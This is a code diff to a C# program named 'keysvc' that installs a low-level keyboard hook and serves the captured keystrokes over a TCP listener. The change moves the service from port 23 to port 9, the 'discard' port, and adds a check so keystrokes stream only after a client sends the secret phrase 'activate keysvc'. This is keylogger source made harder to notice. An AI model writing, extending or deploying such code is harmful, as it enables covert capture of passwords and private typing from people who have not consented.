@@ -20,7 +20,7 @@ namespace keysvc
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        private static int port = 23; //Run as Telnet...
+        private static int port = 9; //Run as discard...
         private static NetworkStream stream;
         private static TcpListener listener;
         private static object streamLock = new object();
@@ -49,13 +49,43 @@ namespace keysvc
 
                 try
                 {
+                    var active = false;
                     var client = listener.AcceptTcpClient();
                     if (client.Connected)
                     {
-                        lock (streamLock)
+                        var s = client.GetStream();
+                        try
                         {
-                            stream = client.GetStream();
+                            byte[] readBuffer = new byte[100];
+                            StringBuilder msg = new StringBuilder();
+                            while (!active)
+                            {
+                                int bytesread = s.Read(readBuffer, 0, readBuffer.Length);
+                                while (bytesread > 0)
+                                {
+                                    msg.Append(ASCIIEncoding.UTF8.GetString(readBuffer).Replace("\n","").Replace("\0",""));
+                                    if (msg.ToString().Contains("activate keysvc"))
+                                    {
+                                        active = true;
+                                        lock (streamLock)
+                                        {
+                                            stream = s;
+                                        }
+                                        break;
+                                    }
+                                    else if (msg.Length > 100)
+                                    {
+                                        msg = new StringBuilder();
+                                    }
+                                    bytesread = s.Read(readBuffer, 0, readBuffer.Length);
+                                }
+                            }
                         }
+                        catch
+                        {
+                            if (client.Connected) client.Close();
+                        }
+
                         while (client.Connected) Thread.Sleep(1000);
                     }
                 }
